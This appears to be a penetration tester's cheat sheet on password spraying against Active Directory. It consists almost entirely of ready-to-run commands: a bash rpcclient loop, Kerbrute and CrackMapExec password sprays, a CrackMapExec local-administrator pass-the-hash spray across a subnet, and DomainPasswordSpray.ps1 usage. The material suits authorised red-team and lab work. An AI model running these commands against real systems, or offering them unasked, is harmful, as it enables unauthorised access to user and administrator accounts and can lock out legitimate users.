# Spraying

## <mark style="color:yellow;">LINUX</mark>

## <mark style="color:blue;">Internal Bash One-Liner Spray</mark>

```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%PASSWORD123" -c "getusername;quit" 13.13.13.13 | grep Authority; done
```

## <mark style="color:blue;">Kerbrute</mark>

```bash
kerbrute passwordspray -d militech.local --dc 13.13.13.13 valid_users.txt PASSWORD123
```

## <mark style="color:blue;">CrackMapExec</mark>

```bash
sudo crackmapexec smb 13.13.13.13 -u valid_users.txt -p PASSWORD123 | grep +
```

#### Local Admin Hash Spray

```bash
sudo crackmapexec smb --local-auth 13.13.13.13/23 -u administrator -H goi12h3084u20ij0d81t082310 | grep +
```

## <mark style="color:yellow;">WINDOWS</mark>

### <mark style="color:blue;">**DomainPasswordSpray.ps1**</mark>

[**\[LINK\]**](https://github.com/dafthack/DomainPasswordSpray)

```bash
PS C:\> Import-Module .\DomainPasswordSpray.ps1
PS C:\> Invoke-DomainPasswordSpray -Password PASSWORD123 -OutFile spray_success -ErrorAction SilentlyContinue
```
